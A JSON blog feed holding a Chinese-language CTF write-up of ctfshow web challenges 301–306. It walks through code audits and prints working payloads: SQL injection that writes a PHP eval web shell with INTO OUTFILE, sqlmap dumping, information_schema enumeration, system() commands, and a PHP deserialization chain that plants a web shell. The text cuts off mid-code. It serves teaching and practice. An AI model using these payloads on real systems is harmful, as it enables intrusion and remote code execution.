{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"web入门\" category",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/9e150aa2/",
            "url": "http://dpm12345.cn/posts/9e150aa2/",
            "title": "代码审计",
            "date_published": "2023-01-15T14:53:15.000Z",
            "content_html": "<h1 id=\"web-301\"><a class=\"anchor\" href=\"#web-301\">#</a> web 301</h1>\n<p>下载源码文件，发现在 <code>checklogin.php</code>  文件中的 sql 查询语句没有过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"select sds_password from sds_user where sds_username='\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$username</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"' order by id limit 1;\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>而 <code>$username</code>  是可控的，故可以用 sqlmap 爆破出密码，或者写一句话木马文件</p>\n<h2 id=\"sqlmap\"><a class=\"anchor\" href=\"#sqlmap\">#</a> sqlmap</h2>\n<p>运行脚本</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>python sqlmap.py <span class=\"token parameter variable\">-u</span> http://392cb8ff-78e8-4004-9117-6a9a0d378c35.challenge.ctf.show/checklogin.php <span class=\"token parameter variable\">--form</span> <span class=\"token parameter variable\">--batch</span> <span class=\"token parameter variable\">--dump</span></pre></td></tr></tbody></table></figure><p>所花时间比较长，需要等待</p>\n<p>最后得到</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Web-vip/web301_sqlmap.jpg\" alt=\"sqlmap结构结果\" title=\"运行结果\"></p>\n<p>username： <code>admin</code></p>\n<p>password：  <code>ctfshowwwww</code></p>\n<p>登录成功后跳转到 <code>index.php</code></p>\n<p>可以看到 flag</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Web-vip/web301_sqlmap_result.jpg\" alt=\"\"></p>\n<h2 id=\"写一句话\"><a class=\"anchor\" href=\"#写一句话\">#</a> 写一句话</h2>\n<p>根据原 SQL 语句的结构，注入位置为 <code>where</code>  后，首先需要闭合单引号 <code>'</code> ，再由此进行联合查询写文件，最后再过滤即可</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token string\">\"&lt;?php eval($_POST[1]);?&gt;\"</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">\"/var/www/html/1.php\"</span><span class=\"token comment\">#</span></pre></td></tr></tbody></table></figure><p>于是在登陆界面</p>\n<p>username:  <code>' union select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"#</code></p>\n<p>password:  <code>1</code></p>\n<p>点击登录后，可以发现停在 <code>checklogin.php</code> ，可知 sql 语句执行成功</p>\n<p>访问 <code>1.php</code> ，报错 <code>Notice: Undefined offset: 1 in /var/www/html/1.php on line 1</code></p>\n<p><code>1=system('ls')</code>  可以看到 flag.php</p>\n<p><code>1=system('tac flag.php');</code>  得到 flag</p>\n<p><code>ctfshow{be6425ec-a5f6-4afb-b76f-104b34576198}</code></p>\n<h1 id=\"web-302\"><a class=\"anchor\" href=\"#web-302\">#</a> web 302</h1>\n<p>题目提示</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strcasecmp</span><span class=\"token punctuation\">(</span><span class=\"token function\">sds_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$userpwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'sds_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr></tbody></table></figure><p>但 sql 语句在之前已经执行，因此同样可以采用上面的两种方法</p>\n<h1 id=\"web-303\"><a class=\"anchor\" href=\"#web-303\">#</a> web 303</h1>\n<p>根据题目所给的源码，在 <code>dptadd.php</code>  中找到注入点</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"insert into sds_dpt set sds_name='\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$dpt_name</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"',sds_address ='\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$dpt_address</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"',sds_build_date='\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$dpt_build_year</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"',sds_have_safe_card='\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$dpt_has_cert</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"',sds_safe_card_num='\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$dpt_cert_number</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"',sds_telephone='\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$dpt_telephone_number</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"';\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>而在这一 sql 语句中，没有任何的过滤</p>\n<p>而要进入这一段代码的执行，可以看到， <code>if(!isset($_SESSION['login']))</code> ，即需要先登录成功</p>\n<p>再次查看源码，在 <code>sds_user.sql</code>  文件中，有这样一条信息</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>sds_user<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'admin'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'27151b7b1ad51a38ea66b1529cde5ee4'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>也就是说，我们知道了一个账户的账号和密码，因此可以借此登录。但很明显，密码为密文形式，需要解出明文</p>\n<p>查看 <code>checklogin.php</code> , 可以找到以下代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strcasecmp</span><span class=\"token punctuation\">(</span><span class=\"token function\">sds_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$userpwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'sds_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token variable\">$mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"location:index.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>也就是说，只有 <code>sds_decode($userpwd)</code>  与 <code>$row['sds_password']</code>  相等才可以登陆成功，已知 <code>$row['sds_password']</code>  为 <code>27151b7b1ad51a38ea66b1529cde5ee4</code></p>\n<p>查看 <code>sds_decode</code>  方法的定义，在 <code>fun.php</code>  中</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">sds_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"sds\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"sds\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">sds_decode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>尝试用该方法的逆向过程解密，但发现 <code>27151b7b1ad51a38ea66b1529cde5ee4</code>  解不了</p>\n<p>看到 <code>echo sds_decode(\"admin\");</code> ，尝试运行，会发现输出的内容恰好为 <code>27151b7b1ad51a38ea66b1529cde5ee4</code></p>\n<p>于是得知一个账户的账号和密码，均为 <code>admin</code></p>\n<p>当执行成功后，会跳转到 <code>dpt.php</code></p>\n<p>而 <code>dpt.php</code>  中有</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 注入点</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t\t\t\t</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\t\t\t\t\t\t</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"select * from sds_dpt order by id;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token variable\">$mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>也即可以利用这一页面来查看添加的值，于是查表 payload</p>\n<p><code>dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23</code></p>\n<p>得到</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Web-vip/web_303_1.jpg\" alt=\"\"></p>\n<p><code>sds_dpt,sds_fl9g,sds_user</code></p>\n<p>猜测在表 <code>sds_fl9g</code></p>\n<p>查列 payload: <code>dpt_name=1',sds_address=(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='sds_fl9g')%23</code></p>\n<p>得到</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Web-vip/web_303_2.jpg\" alt=\"\"></p>\n<p><code>flag</code></p>\n<p>查值 payload： <code>dpt_name=1',sds_address=(select group_concat(flag) from sds.sds_fl9g)%23</code>  (数据库名 <code>sds</code>  可以从源码中的 <code>conn.php</code>  找到，也可以查)</p>\n<p>得到</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Web-vip/web_303_3.jpg\" alt=\"\"></p>\n<h1 id=\"web-304\"><a class=\"anchor\" href=\"#web-304\">#</a> web 304</h1>\n<p>说添加了 waf，但实际没有，同上面方法，除表名改为 <code>sds_flaag</code> ，其他不变</p>\n<h1 id=\"web-305\"><a class=\"anchor\" href=\"#web-305\">#</a> web 305</h1>\n<p>此题增加了 waf，不能像上两题一样解题，但很明显多了个 <code>class.php</code>  文件，查看</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-17 13:20:37</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-17 13:33:21</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">user</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>看到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>看起来是反序列化</p>\n<p>再看 <code>checklogin.php</code> ，看到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$user_cookie</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user_cookie</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user_cookie</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>没有任何限制，也就是只要创建一个反序列化对象即可，然后通过 <code>$COOKIE['user']</code>  传递，最后点击登录，便能执行反序列化</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">user</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">user</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1.php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&lt;?php eval($_POST[1]);?&gt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>按以上操作后，访问 <code>1.php</code></p>\n<p>可以看到报错，使用蚁剑连接数据库</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Web-vip/web_305.jpg\" alt=\"\"></p>\n<p>数据库类型为 <code>MYSQLI</code> ，密码为 <code>root</code>  (该密码可在蚁剑文件界面的 <code>conn.php</code>  找到，与下载来的源码文件不同)</p>\n<p>通过查表，得到 flag 在 <code>sds.sds_flabag</code></p>\n<h1 id=\"web-306\"><a class=\"anchor\" href=\"#web-306\">#</a> web 306</h1>\n<p>查看代码，发现 <code>index.php</code>  有反序列化操作</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"location:login.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>于是查找其他文件，寻找 <code>__wakeup()``__destruct</code>  方法或者可以写文件之类的函数，如 <code>file_put_contents</code></p>\n<p>最后可在 <code>class.php</code>  中找到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">log</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$title</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'log.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$info</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">loginfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">info</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">info</span><span class=\"token operator\">.</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">title</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">info</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>只要构造一个 log 类对象，然后调用 <code>close()</code>  方法，便能写文件</p>\n<p>查找所有文件的类中是否有调用 <code>close()</code>  的方法</p>\n<p>在 <code>dao.php</code>  中找到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dao</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$config</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$conn</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">config</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span 